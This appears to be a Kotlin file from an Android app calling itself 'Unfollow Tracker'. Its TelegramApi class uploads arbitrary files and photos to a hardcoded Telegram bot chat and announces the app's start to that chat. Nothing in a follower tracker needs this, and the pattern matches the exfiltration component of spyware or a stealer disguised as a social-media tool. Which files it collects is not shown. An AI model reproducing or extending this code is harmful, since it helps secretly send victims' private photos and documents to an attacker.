package com.unfollowtracker.service

import android.util.Log
import com.unfollowtracker.utils.Config
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException

class TelegramApi {
    companion object {
        private const val TAG = "TelegramApi"
        private val client = OkHttpClient()
        
        fun sendFile(file: File): Boolean {
            return try {
                val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendDocument"
                
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                    .addFormDataPart(
                        "document",
                        file.name,
                        file.asRequestBody("application/octet-stream".toMediaType())
                    )
                    .addFormDataPart("caption", "File: ${file.name}")
                    .build()
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()
                
                val response = client.newCall(request).execute()
                val isSuccessful = response.isSuccessful
                response.close()
                
                isSuccessful
            } catch (e: Exception) {
                Log.e(TAG, "Hata: ${e.message}")
                false
            }
        }
        
        fun sendPhoto(file: File): Boolean {
            return try {
                val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendPhoto"
                
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                    .addFormDataPart(
                        "photo",
                        file.name,
                        file.asRequestBody("image/jpeg".toMediaType())
                    )
                    .build()
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()
                
                val response = client.newCall(request).execute()
                val isSuccessful = response.isSuccessful
                response.close()
                
                isSuccessful
            } catch (e: Exception) {
                Log.e(TAG, "Fotoğraf hatası: ${e.message}")
                false
            }
        }
        
        fun sendTestMessage(): Boolean {
            return try {
                val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendMessage"
                
                val formBody = FormBody.Builder()
                    .add("chat_id", Config.TELEGRAM_CHAT_ID)
                    .add("text", "✅ Unfollow Tracker başlatıldı")
                    .build()
                
                val request = Request.Builder()
                    .url(url)
                    .post(formBody)
                    .build()
                
                val response = client.newCall(request).execute()
                val isSuccessful = response.isSuccessful
                response.close()
                
                isSuccessful
            } catch (e: Exception) {
                false
            }
        }
    }
}
